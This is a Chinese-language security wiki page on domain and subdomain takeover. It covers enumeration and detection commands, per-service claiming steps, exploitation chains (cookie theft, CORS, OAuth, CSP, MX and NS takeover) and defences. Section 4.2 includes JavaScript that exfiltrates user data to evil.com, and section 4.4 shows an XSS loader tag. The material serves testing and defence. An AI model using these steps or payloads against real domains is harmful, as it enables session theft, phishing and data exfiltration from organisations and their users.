---
attack_surface: [认证/授权绕过, 信息泄露, 客户端利用]
impact: [身份伪造, 机密性破坏, 信息泄露, 完整性破坏]
risk_level: 高
prerequisites:
  - DNS 基础（A/CNAME/NS/MX 记录类型）
  - 子域名枚举工具使用经验
  - 基本 Web 安全知识（Cookies / CORS / CSP / OAuth）
related_techniques:
  - cors-misconfigurations
  - csp-bypass
  - csrf
  - oauth-token-theft
  - idor
difficulty: 中级
tools:
  - subzy
  - subjack
  - can-i-take-over-xyz
  - nuclei (-tags takeover)
  - dnsReaper
---

# Domain/Subdomain Takeover — 域名/子域名接管攻击全矩阵
> 关联文档：[IDOR](../IDOR/README.md) · [CORS Bypass](../../User%20input/HTTP%20Headers/CORS%20Misconfigurations%20%26%20Bypass/README.md) · [CSP Bypass](../../User%20input/HTTP%20Headers/CSP%20Bypass/README.md) · [CSRF](../../User%20input/Forms-WebSockets-PostMsgs/Cross%20Site%20Request%20Forgery/README.md) · [Cookies Hacking](../../User%20input/HTTP%20Headers/Cookies%20Hacking/README.md)

---

# 0x01 原理与分类

## 1.0 TL;DR

域名/子域名接管（Domain/Subdomain Takeover）的**根本原因**是 DNS 记录中存在**悬空指针**——CNAME/A/NS 记录指向了一个已经过期、被删除或未注册的外部服务名。攻击者注册这个外部服务名，即可在被指向的域名上提供任意内容，从而实现身份伪造、Cookie 窃取、CORS/CSP 绕过、OAuth 令牌劫持等连锁攻击。

与大多数 Web 漏洞不同，这个漏洞**不在目标服务器上发生**——它利用的是 DNS 基础设施中的配置残留。

## 1.1 根本原理 — DNS 悬空指针

核心机制可以类比为"指针未释放"：

```
company.com 的子域  analytics.company.com
           ↓ CNAME
第三方服务    analytics.company.herokuapp.com
           ↓ 服务过期/被删除
悬空 CNAME   analytics.company.herokuapp.com  ← 任何人都可以注册这个名字
           ↓ 攻击者注册
恶意内容    攻击者控制的 Heroku 应用 ← 在同一域名下提供任意内容
```

**Domain Takeover**（域名接管）：主域名本身过期未被续费，攻击者直接购买该域名。

**Subdomain Takeover**（子域名接管）：子域名的 CNAME/A 记录指向的第三方服务已被释放，但 DNS 记录未清理，攻击者在该第三方服务上注册同名资源。

三种典型根因：

| 类型 | 场景 | 示例 |
|------|------|------|
| **云服务残留** | 删除了云资源但保留 DNS 记录 | S3 bucket 删除 / Heroku app 销毁 / GitHub Pages 仓库删除 |
| **外部域名过期** | CNAME 指向的外部域名过期未续费 | `sub.target.com → old-provider.com`，`old-provider.com` 过期可被注册 |
| **未认领资源** | 指向从未被注册过的服务名 | `sub.target.com → unclaimed.github.io`，该 GitHub 用户名从未被占用 |

**关键区分**：前两种是"曾经存在，后来消失"，第三种是"从未存在，但可被创建"。第三种在大型组织的 DNS 中最常见——开发者在 DNS 中预配置了指向某个服务的 CNAME，但从未真正创建该服务。

子域名接管本质上是 DNS 级别的欺骗——攻击者控制了该子域在互联网上的解析结果，浏览器透明地将攻击者内容显示在合法域名下。攻击者可结合 [_typosquatting_](https://en.wikipedia.org/wiki/Typosquatting)（域名抢注）和 [_Doppelganger domains_](https://en.wikipedia.org/wiki/Doppelg%C3%A4nger)（仿冒域名）技术进一步扩大攻击面，这些技术在子域名接管的基础上使钓鱼 URL 在浏览器地址栏中看起来完全合法，欺骗用户并绕过基于域名信誉的垃圾邮件过滤器。

## 1.2 攻击前提与触发条件

| 条件 | 说明 |
|------|------|
| **悬空 DNS 记录** | CNAME/A/AAAA/ALIAS/ANAME 指向已释放的外部资源 |
| **外部服务允许名称占用** | 目标平台允许用户注册已释放的服务名（无所有权验证） |
| **服务名可预测或被泄露** | 攻击者能通过 DNS 枚举得知被指向的服务名 |
| **服务名未被他人占用** | 目标是"先到先得"的平台（大多数 PaaS/IaaS 如此） |

## 1.3 攻击面分类

```
Subdomain Takeover 攻击矩阵
├── 直接利用
│   ├── 内容托管：在被接管子域上提供钓鱼/恶意内容
│   └── SSL 证书签发：通过 Let's Encrypt 为被接管域获取合法证书
├── Cookie 相关
│   ├── Session Cookie 窃取（含 Same-Site Lax 绕过）
│   └── 父域 Cookie 作用域继承
├── Web 策略绕过
│   ├── CORS 信任域绕过：子域被允许访问主站 API
│   ├── CSP script-src 绕过：子域在白名单中
│   ├── OAuth redirect_uri 劫持
│   └── CSRF Same-Site 保护绕过
├── 邮件相关
│   └── MX 记录接管：收发来自合法子域的邮件
├── DNS 基础设施
│   ├── NS 记录部分接管
│   └── Wildcard DNS 任意子域生成
├── 供应链放大
│   ├── 被接管子域上的 JS SDK → 植入恶意 JS → 感染所有引用方
│   └── 外部 <script> 标签失效 → 原功能静默失败 → 无可见告警
└── 非技术影响
    ├── SEO 排名操纵：在被接管子域上发布垃圾内容，搜索引擎惩罚主域
    ├── 恶意软件分发：绕过基于域名信誉的防火墙/安全过滤
    └── 内网横向移动：被接管子域作为进入企业网络的跳板（VPN/内部应用常绑定子域）
```

---

# 0x02 检测与发现

## 2.1 悬空 DNS 记录识别

**特征识别矩阵**：

| 服务类型 | 悬空特征 | HTTP 响应/错误签名 |
|---------|---------|-------------------|
| **AWS S3** | CNAME → `<bucket>.s3.amazonaws.com` 但 bucket 不存在 | `NoSuchBucket` XML |
| **CloudFront** | CNAME → `<id>.cloudfront.net` 但分发已删除 | `Bad Request` / 证书错误 |
| **Azure Websites** | CNAME → `<site>.azurewebsites.net` | `404 Not Found` + Azure 标志 |
| **GitHub Pages** | CNAME → `<user>.github.io` | `404 There isn't a GitHub Pages site here.` |
| **Heroku** | CNAME → `<app>.herokuapp.com` | `No such app` |
| **Netlify** | CNAME → `<site>.netlify.app` | `Not Found` + Netlify 标志 |
| **Vercel** | CNAME → `cname.vercel-dns.com` | `DEPLOYMENT_NOT_FOUND` |
| **Fastly** | CNAME → `<service>.global.ssl.fastly.net` | `Fastly error: unknown domain` |
| **Shopify** | CNAME → `<store>.myshopify.com` | `Sorry, this shop is currently unavailable.` |
| **Zendesk** | CNAME → `<account>.zendesk.com` | `Oops, this help center no longer exists` |
| **Atlassian** | CNAME → `<site>.atlassian.net` | `Page Not Found` |
| **Google Cloud** | CNAME → `c.storage.googleapis.com` 或 `appspot.com` | GCP 404 错误页 |
| **WordPress** | CNAME → `<site>.wordpress.com` | `Do you want to register ...?` |
| **Linode** | CNAME → `<id>.linodeobjects.com` | `NoSuchBucket` |

## 2.2 自动化检测工具链

**第一步 — 子域名枚举**：

```bash
# 被动收集
subfinder -d target.com -o subs.txt
assetfinder --subs-only target.com >> subs.txt

# 主动爆破
puredns bruteforce all.txt target.com -r 8.8.8.8 -w resolved.txt
```

**第二步 — 存活验证 + Takeover 检查**：

```bash
# subzy — 快速检查悬空 CNAME（推荐首选用）
subzy run --targets resolved.txt --hide-fails --concurrency 100

# nuclei — 基于指纹匹配的 takeover 检测
cat resolved.txt | httpx -silent | nuclei -t ~/nuclei-templates/takeovers/ -tags takeover

# subjack — 经典工具，指纹库丰富
subjack -w resolved.txt -t 100 -timeout 30 -o results.txt -ssl -c fingerprints.json

# dnsReaper — 专门针对云服务接管
dnsReaper --parallelism 30 --cname-only --target-file resolved.txt

# bbot — 全自动化子域名枚举 + 接管检测
bbot -t target.com -m subdomain-enum

# tko-sub — 多服务接管检测
tko-sub -data providers.csv -domain target.com

# SubOver — 专注于主流云服务的接管检测
SubOver -l resolved.txt -a -https -timeout 30

# cariddi — 爬虫 + 接管端点发现
cariddi -s -e -t takeover -intensive -target https://target.com

# takeit — 自动化接管检测 + 注册尝试
takeit --target target.com --threads 30

# mx-takeover — MX 记录邮件接管检测
mx-takeover -d target.com -o results.txt

# sub-domain-takeover (ArifulProtik) — 接管检查工具箱
# Subdomain-Takeover (SaadAhmedx) — 自动化接管检测
# subdomain-takeover (antichown) — 悬空记录发现
```

**第三步 — 手工验证**（自动化工具可能误报）：

```bash
# 检查 CNAME 目标是否存在
dig CNAME sub.target.com
# 对 CNAME 目标做 HTTP 探测
curl -sI http://<cname-target> | head -20
```

**Nuclei 模板示例** — 为新的可接管服务编写检测模板：

```yaml
id: gohire-takeover
info:
  name: Gohire.io Takeover Detection
  author: security-researcher
  severity: medium
  description: Detects subdomains pointing to unclaimed Gohire.io instances

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "You may have followed an invalid link"
          - "or the page has been removed"
        condition: and
      - type: status
        status:
          - 404
```

**Nuclei 批量扫描**（内置 76+ 服务指纹）：

```bash
cat resolved.txt | httpx -silent | nuclei -t ~/nuclei-templates/http/takeovers/ -o takeover-results.txt
```

## 2.3 手工验证流程

当工具标记一个子域名可能存在接管风险时，按以下步骤验证：

1. **解析 DNS**：`dig sub.target.com A` + `dig sub.target.com CNAME`
2. **访问 CNAME 目标**：直接 curl 第三方服务 URL，检查响应签名
3. **尝试注册**：在第三方平台上尝试创建同名资源 —— 如果成功，漏洞确认
4. **检查所有权验证**：某些平台（GitLab Pages）需要域名所有权验证 → 不可利用
5. **核对错误签名**：对比 2.1 表中的特征签名，确认服务类型

**PoC 最佳实践**：接管验证时，**不要在子域首页放置内容**。在子域上创建一个随机路径的 HTML 文件作为 PoC（如 `sub.target.com/akjehajkgehagjeahgjkehakghjaehg.html`），包含纯文本说明（如 `<!-- hackerone.com/your-username -->`）。这避免损害品牌声誉，且被安全团队和 HackerOne 等平台认可。

---

## 2.4 APIs 与数据源

外部 API 和数据库用于辅助子域名发现和历史 DNS 分析：

| 服务 | 用途 | URL |
|------|------|-----|
| **SecurityTrails** | 历史 DNS 记录、被动 DNS API | [securitytrails.com](https://securitytrails.com/) |
| **RiskIQ / PassiveTotal** | 威胁情报 + 被动 DNS | [community.riskiq.com](https://community.riskiq.com/) |
| **Farsight DNSDB** | 历史被动 DNS 数据库 | [farsightsecurity.com](https://www.farsightsecurity.com/solutions/dnsdb/) |
| **DomainTools Iris** | 域名历史 + WHOIS 调查 | [domaintools.com](https://www.domaintools.com/products/iris/) |
| **Censys** | 证书透明度 + 主机数据 | [search.censys.io](https://search.censys.io/) |
| **Shodan** | 全球主机扫描 + 服务指纹 | [shodan.io](https://www.shodan.io/) |
| **VirusTotal** | 历史 DNS + URL 分析 | [virustotal.com](https://www.virustotal.com/) |
| **ProjectDiscovery Chaos** | 公开子域名数据集 | [chaos.projectdiscovery.io](https://chaos.projectdiscovery.io/) |

这些数据源对于发现已删除但 DNS 记录未清理的历史子域尤其有用——被动 DNS 记录可能显示过去使用的 CNAME 目标，攻击者可据此发现悬空记录。

---

# 0x03 常见接管目标服务

## 3.1 云存储服务

**AWS S3**：
```
CNAME: target.com → target-bucket.s3.amazonaws.com
悬空: bucket 已被删除或未创建
注册: 在任意 AWS 账户中创建同名 bucket → 上传任意内容
响应: NoSuchBucket → 可接管
```

**Google Cloud Storage**：
```
CNAME: cdn.target.com → c.storage.googleapis.com
悬空: bucket 未在匹配的 GCP 项目中创建
要求: bucket 名全局唯一 → 先注册先得
```

**Azure Blob Storage**：
```
CNAME: static.target.com → target.blob.core.windows.net
悬空: storage account 已删除
```

## 3.2 PaaS / 托管平台

**GitHub Pages** — 最常被利用的目标：
```
CNAME: docs.target.com → target.github.io
悬空: target.github.io 这个 organization/user 名未被注册
利用: 注册 GitHub 账号 target → 创建 target.github.io Pages → 配置自定义域名
```

```bash
# 检测 GitHub Pages 接管
host docs.target.com | grep github.io
curl -s https://target.github.io | grep "There isn't a GitHub Pages site here"
# → 如果命中，注册 target 用户名即可接管
```

**Heroku**：
```
CNAME: api.target.com → target-api.herokuapp.com
悬空: Heroku app 已删除
利用: heroku create target-api → 部署任意应用
```

**Netlify / Vercel**：
```
CNAME: app.target.com → target-app.netlify.app
悬空: Netlify site 已删除
利用: 在 Netlify 中创建同名 site → 上传任意内容
```

## 3.3 CDN / 边缘服务

**CloudFront**：
```
CNAME: cdn.target.com → d123.cloudfront.net
悬空: CloudFront distribution 已删除
利用: 在任意 AWS 账户创建 CloudFront distribution → 关联目标 CNAME
注意: CloudFront 要求 SSL 证书验证 → 需要额外步骤
```

**Fastly**：
```
CNAME: www.target.com → target.map.fastly.net
悬空: Fastly service 已删除
利用: 创建 Fastly service 并 claim 域名
```

## 3.4 SaaS 平台

**Shopify** — 高价值目标（常用于电商子域）：
```
CNAME: shop.target.com → target-store.myshopify.com
悬空: Shopify store 已关闭或未激活
利用: 注册 myshopify.com 子域 → 配置自定义域名 → 完整的合法外观钓鱼站
```

**Zendesk**：
```
CNAME: help.target.com → target.zendesk.com
利用: 创建 Zendesk 账户 → 配置 help center → 钓鱼/凭证收集
```

**Freshdesk / Intercom / Help Scout** — 同类客服平台接管模式同上。

---

# 0x04 利用链与影响扩大

## 4.1 Cookie 窃取与 Same-Site 绕过

这是子域名接管的**最直接影响**——攻击者获得了在 `sub.target.com` 下注入任意 JavaScript 的能力。

**Cookie 作用域规则**：
- Domain 属性为 `.target.com` 的 Cookie 会被自动发送到所有子域
- 即使 Cookie 设置了 `SameSite=Lax`，来自子域的顶级导航仍会携带 Cookie
- `SameSite=Strict` 可防御但极少在生产中使用

**攻击流程**：
```
受害者访问 attacker-controlled.phishing.target.com
    ↓
页面发起 POST → main.target.com/api/...
    ↓
浏览器自动携带 domain=.target.com 的 session cookie
    ↓
攻击者读取 API 响应 / 发起 CSRF 操作
```

**重要细节 — httpOnly 和 Secure 标志不防护**：即使 Cookie 设置了 `httpOnly`（禁止 JS 读取）和 `Secure`（仅 HTTPS），也无法防御子域接管场景。因为攻击者控制的是整个子域的**服务器端**——可以通过 CloudFront 日志、Heroku 日志等后端方式获取 Cookie，而非通过前端 JS。

**经典案例 — Ubiquiti Networks（Arne Swinnen 报告）**：

> Ubiquiti 使用 SSO 系统，session cookie 设置了 `domain=.ubnt.com`，所有子域共享。其中一个子域 `crm.ubnt.com` 的 CNAME 指向了未认领的 AWS CloudFront distribution。攻击者注册该 CloudFront distribution（无需任何验证），并通过 CloudFront 的访问日志功能捕获所有发往该子域的请求——包括携带 `domain=.ubnt.com` session cookie 的请求。由于 Cookie 是跨子域共享的，这些 session cookie 可访问 Ubiquiti 的所有 SSO 保护系统。**注意**：httpOnly 和 Secure 标志对于防御此攻击完全无效，因为攻击者通过服务器端日志窃取 Cookie 而非浏览器端 JS。

## 4.2 CORS 信任域滥用

许多应用的 CORS 配置将子域列入白名单：

```http
Access-Control-Allow-Origin: https://sub.target.com
Access-Control-Allow-Credentials: true
```

接管 `sub.target.com` 后，攻击者可以从该源发起带凭据的跨域请求，读取主站敏感数据：

```javascript
// 部署在被接管子域上的恶意 JS
fetch('https://main.target.com/api/user/emails', { credentials: 'include' })
  .then(r => r.json())
  .then(data => {
    // 将敏感数据回传至攻击者服务器
    fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(data) });
  });
```

## 4.3 OAuth `redirect_uri` 劫持

如果 OAuth 提供方的 `redirect_uri` 白名单包含整个子域或通配符，被接管的子域可以接收授权码：

```http
https://auth.target.com/authorize?
  client_id=xxx&
  redirect_uri=https://hijacked-sub.target.com/callback&
  response_type=code
```

攻击者在被接管子域上部署 callback 端点 → 接收 authorization code → 交换 access_token → 账户接管。

## 4.4 CSP 策略穿透

当 CSP 策略将子域列入 `script-src` 时：

```
Content-Security-Policy: script-src 'self' https://*.target.com
```

攻击者在被接管子域上托管任意 JS 文件，主站可直接加载：

```html
<!-- 主站页面上的 XSS payload -->
<script src="https://hijacked-sub.target.com/exploit.js"></script>
<!-- CSP 放行 → 恶意 JS 执行 -->
```

这是将"看起来无意义的子域接管"升级为"主站完整 XSS"的关键路径。

## 4.5 MX 邮件接管

如果存在指向外部邮件服务的 MX 记录：

```
sub.target.com.  IN  MX  10  mail.provider.com
```

当 `mail.provider.com` 下的资源被释放，攻击者注册后可：
- **接收**发往 `@sub.target.com` 的所有邮件（密码重置、验证码、客户通信）
- **发送**看似来自 `@sub.target.com` 的合法邮件（钓鱼、社会工程）

**SPF/TXT 记录滥用**：当接管包含完整 DNS 控制（如 NS 接管或某些云平台的 DNS 面板）时，攻击者可修改 TXT 记录来配置 SPF，使从被接管子域发出的邮件**通过 SPF 验证**。发送的钓鱼邮件将出现在目标域的合法邮件流中，传统反垃圾邮件过滤几乎无法检测。

## 4.6 NS 记录部分接管

如果 NS 记录指向可被接管的名称服务器：

```
sub.target.com.  IN  NS  ns1.unregistered-provider.com
```

攻击者注册 `unregistered-provider.com` → 搭建名称服务器 → 对 `sub.target.com` 的整个 DNS 子树拥有完全控制权。

**概率分析**：多数域配置了多个 NS 记录做冗余。如果只有 1/2 的 NS 被接管，每次 DNS 查询有 **50% 概率**命中攻击者的 NS。攻击者可通过设置**极高 TTL**（如 86400+ 秒）使恶意结果在 DNS 缓存中长时间保留。对于公共 DNS 解析器（Google DNS 8.8.8.8、Cloudflare 1.1.1.1），一旦恶意记录被缓存，**所有使用该解析器的用户**都会受影响——这是一次写入、多用户感染的放大效应。

**攻击不限于子域**：NS 接管意味着攻击者控制了该域下**所有层级**的 DNS——不仅是 `sub.target.com`，还包括 `a.sub.target.com`、`b.a.sub.target.com` 等任意子域。

**真实案例 — .IO 顶级域 NS 接管（Matthew Bryant）**：.IO TLD 的其中一台权威名称服务器 `ns-a1.io` 的域名过期。Bryant 注册了该域名并搭建了名称服务器，开始接收对 **所有 .IO 域** 的 DNS 查询。虽然只是 7 台 NS 中的 1 台，但每台 NS 独立响应——1/7 的 .IO DNS 流量经过攻击者控制的基础设施。

## 4.7 外部 JS 资源接管与 SRI 绕过

当主站通过 `<script>` 标签从子域加载 JS 资源时，子域接管可导致**代码注入**：

```html
<!-- 主站页面 -->
<script src="https://cdn.target.com/tracking.js"></script>
```

如果 `cdn.target.com` 被接管，攻击者用自己的 JS 替换 `tracking.js` → 在主站源下执行任意代码。**更隐蔽的是**：原 CDN 子的 JS 功能静默失效——用户界面无任何可见错误——攻击可以在不被察觉的情况下持续运行。

**Subresource Integrity (SRI) 是唯一有效的浏览器端防护**：

```html
<!-- 安全：浏览器拒绝加载不匹配哈希的 JS -->
<script src="https://cdn.target.com/tracking.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQGybrx5CO9hJ1RmTuZB6Y"
  crossorigin="anonymous"></script>

<!-- 危险：无 SRI → 子域接管后任意 JS 可执行 -->
<script src="https://cdn.target.com/tracking.js"></script>
```

---

# 0x05 DNS Wildcard 接管生成

## 5.1 Wildcard + CNAME 组合攻击

DNS Wildcard 记录会在所有未显式定义的子域上生效。当 Wildcard 指向的是**可被接管的第三方服务**时，攻击者可以**创造任意数量**的受害子域：

```
*.target.com.  IN  CNAME  target.github.io
                           ↑ GitHub Pages → 攻击者注册 target 用户
```

攻击者注册目标 GitHub 账号后，**所有** `*.target.com` 的子域（包括 `login.target.com`、`mail.target.com`、`internal.target.com` 等看起来可信的名称）都解析到攻击者的 GitHub Pages。

**CTF 实战案例**：[niteCTF 2022 undocumented-js-api](https://ctf.zeyu2001.com/2022/nitectf-2022/undocumented-js-api) — 利用 Wildcard CNAME 指向 GitHub Pages 完成挑战。

## 5.2 检测 Wildcard 配置

```bash
# 测试 Wildcard — 查询不可能存在的随机子域
RANDOM="$(openssl rand -hex 8)"
dig "${RANDOM}.target.com" A

# 如果有 Wildcard → 返回 IP/别名
# 如果无 Wildcard → NXDOMAIN

# 检查 Wildcard 是否指向可接管服务
dig "${RANDOM}.target.com" CNAME
# 如果 CNAME 指向 github.io / herokuapp.com / netlify.app 等 → 可接管
```

---

# 0x06 检测与防御

## 6.1 攻击方检测清单

- [ ] 子域名枚举（subfinder + assetfinder + crt.sh + chaos）
- [ ] DNS 解析所有子域 → 提取 CNAME/A/NS/MX 记录
- [ ] 自动化接管检查（subzy + nuclei -tags takeover）
- [ ] 手工验证 CNAME 目标是否悬空（直接访问 + 错误签名匹配）
- [ ] 检查 Wildcard DNS → 是否存在 CNAME 到可接管服务
- [ ] 尝试注册悬空服务名（在非破坏性确认后）
- [ ] CORS 头检查：被接管子域是否在主站 Access-Control-Allow-Origin 中
- [ ] CSP 头检查：被接管子域是否在 script-src 白名单中
- [ ] OAuth redirect_uri 检查：子域通配符是否在允许列表中

## 6.2 防御方措施

| 级别 | 措施 | 效果 |
|------|------|------|
| **流程** | DNS 记录清理作为资源销毁流程的**第一步** | 从根源消除悬空记录 |
| **流程** | DNS 记录创建作为资源创建的**最后一步** | 避免创建指向不存在资源的记录 |
| **技术** | 使用第三方服务前预注册/验证域名所有权（[GitLab Pages 已实施此机制](https://about.gitlab.com/2018/02/05/gitlab-pages-custom-domain-validation/)：在自定义域名生效前需完成 DNS TXT 记录验证） | 阻止他人接管 |
| **技术** | 定期自动化扫描自己的域名空间（aquatone / subzy 内部使用） | 在攻击者之前发现悬空记录 |
| **架构** | 避免 CNAME 到外部可注册服务 — 使用 A 记录或代理 | 消除可注册竞态 |
| **架构** | CSP/CORS 不使用通配符子域 | 限制单点接管的影响范围 |
| **架构** | `SameSite=Strict` 或使用独立 session cookie 域 | 限制 Cookie 继承 |

**关键一步**：如果你的组织使用了 Heroku / GitHub Pages / Netlify / S3 等服务，确保在关闭任何应用/服务的同时**立即清理**对应的 DNS 记录。这是目前最频发的子域名接管根因。

---

## 参考资料

- [Subdomain Takeover Guide — 0xpatrik](https://0xpatrik.com/subdomain-takeover/)
- [can-i-take-over-xyz — EdOverflow](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subdomain Takeover Guide — Stratus Security](https://www.stratussecurity.com/post/subdomain-takeover-guide)
- [HackerOne Guide to Subdomain Takeovers](https://www.hackerone.com/blog/guide-subdomain-takeovers-20)
- [subzy — PentestPad](https://github.com/PentestPad/subzy)
- [dnsReaper — punk-security](https://github.com/punk-security/dnsReaper)
- [nuclei takeover templates — ProjectDiscovery](https://github.com/projectdiscovery/nuclei)
- [Wildcard DNS Takeover CTF Write-up — niteCTF 2022](https://ctf.zeyu2001.com/2022/nitectf-2022/undocumented-js-api)
- [subjack — haccer](https://github.com/haccer/subjack)
- [bbot — blacklanternsecurity](https://github.com/blacklanternsecurity/bbot)
